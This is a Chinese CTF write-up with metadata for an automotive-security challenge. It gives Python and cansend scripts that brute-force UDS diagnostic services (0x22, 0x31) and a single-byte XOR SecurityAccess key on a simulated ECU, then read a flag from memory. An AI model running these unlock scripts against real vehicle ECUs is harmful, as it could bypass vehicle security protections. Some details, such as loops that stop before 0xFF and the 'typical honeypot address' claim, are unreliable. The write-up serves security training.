---
title: 【WriteUP】VSEC 车联网安全 CTF 挑战赛（三）
contest: VSEC
year: 2024
difficulty: medium
vuln_type: misc_unknown
tags: [UDS-ReadDataByIdentifier-Service-0x22, RoutineControl-Service-0x31, SecurityAccess-Service-0x27-XOR, single-byte-XOR-brute, 0xc0ffe000, 0x7E0-TesterPresent]
attack_chain: 1. Service 0x22 读数据 identifier 遍历 (0x03 0x22 i j)/2. Service 0x31 RoutineControl 遍历 (0x04 0x31 0x01 i j) 过滤 037f3131/3. Service 0x27 SecurityAccess 单字节 XOR 爆破 (0x02 0x11 0x01 reset + 0x02 0x27 0x01 seed) + (0x06 0x27 0x02 key1 key2 key3 key4)/4. 0x20 成功 seed ^ 0x20 = key/5. ReadMemory 0xc0ffe000 看 flag
key_payload: Service 0x22 i,j 遍历  Service 0x31 i,j RoutineControl  Service 0x27 单字节 XOR 爆破 0x20
one_liner: VSEC 车联网安全 CTF（三），UDS Service 0x22/0x31/0x27 全套诊断 + 单字节 XOR 爆破 SecurityAccess。
lesson: UDS Service 0x22 ReadDataByIdentifier 遍历 (DID, i, j) 找有效数据；0x31 RoutineControl 爆破 (routine_id, sub_func)；0x27 SecurityAccess 单字节 XOR 可 0x00-0xFF 爆破；0xc0ffe000 是典型蜜罐地址。
quality: high
---

# 【WriteUP】VSEC 车联网安全 CTF 挑战赛（三）

## 概览
VSEC 车联网安全 CTF 第三弹，UDS Service 0x22 / 0x31 / 0x27 全套诊断 + 单字节 XOR 爆破。

## 题目 1: Service 0x22 数据识别
```python
import can
import binascii

bus = can.Bus(interface='socketcan', channel='vcan0')
for i in range(0, 0xFF):
    for j in range(0, 0xFF):
        message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                             data=[0x03, 0x22, i, j, 0x00, 0x00, 0x00, 0x00])
        bus.send(message, timeout=0.2)
        msg = bus.recv()
```
```bash
cansend vcan0 7E0#03220008
cansend vcan0 7E0#3000000000000000
```

## 题目 2: RoutineControl (0x31)
```python
for i in range(0, 0xFF):
    for j in range(0, 0xFF):
        time.sleep(0.01)
        message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                             data=[0x04, 0x31, 0x01, i, j, 0x00, 0x00, 0x00])
        bus.send(message, timeout=0.2)
        msg = bus.recv()
        result = binascii.hexlify(msg.data).decode('utf-8')
        if result == "037f3131":
            pass  # 否定响应
        else:
            print("i: ", hex(i), " j: ", hex(j))
```

## 题目 3: SecurityAccess 单字节 XOR 爆破
```python
for key in range(0, 0xFF):
    # ECU reset
    message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                         data=[0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
    bus.send(message, timeout=0.2)
    msg = bus.recv()
    time.sleep(1)
    
    # 0x27 01 request seed
    message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                         data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
    bus.send(message, timeout=0.2)
    msg = bus.recv()
    result = binascii.hexlify(msg.data).decode('utf-8')
    seed = result[6:14]  # 4 字节 seed
    
    # XOR 计算 key
    key1 = int(seed[:2], 16) ^ key
    key2 = int(seed[2:4], 16) ^ key
    key3 = int(seed[4:6], 16) ^ key
    key4 = int(seed[6:8], 16) ^ key
    
    # 0x27 02 send key
    message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                         data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00])
    bus.send(message, timeout=0.2)
    msg = bus.recv()
    result = binascii.hexlify(msg.data).decode('utf-8')
    if result == "037f2735":  # 否定
        pass
    else:
        print("key: ", hex(key))
```

## 最终攻击
```python
# 0x20 成功 key
message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                     data=[0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
bus.send(message, timeout=0.2)
msg = bus.recv()
result = binascii.hexlify(msg.data).decode('utf-8')
seed = result[6:14]
key1 = int(seed[:2], 16) ^ 0x20
key2 = int(seed[2:4], 16) ^ 0x20
key3 = int(seed[4:6], 16) ^ 0x20
key4 = int(seed[6:8], 16) ^ 0x20

message = can.Message(arbitration_id=0x7E0, is_extended_id=False, dlc=8, 
                     data=[0x06, 0x27, 0x02, key1, key2, key3, key4, 0x00])
bus.send(message, timeout=0.2)
msg = bus.recv()
# 流控 0x30 00...
```

## 题目 4: 0xc0ffe000 内存
- 蜜罐地址
- ReadMemoryByAddress 读 flag

## 经验提炼
- UDS Service 0x22 ReadDataByIdentifier 遍历 (DID, i, j) 找有效数据
- 0x31 RoutineControl 爆破 (routine_id, sub_func)
- 0x27 SecurityAccess 单字节 XOR 可 0x00-0xFF 爆破
- 0xc0ffe000 是典型蜜罐地址
- 否定响应码 7F 是过滤条件
- 0x11 0x01 是 ECU reset (HardReset)
- Service 0x27 01 = requestSeed，02 = sendKey
- 流控帧 0x30 00 00... 用于多帧响应
- 0x7E0 是诊断请求 ID
- DiagnosticSessionControl 0x10 0x02 = ExtendedSession
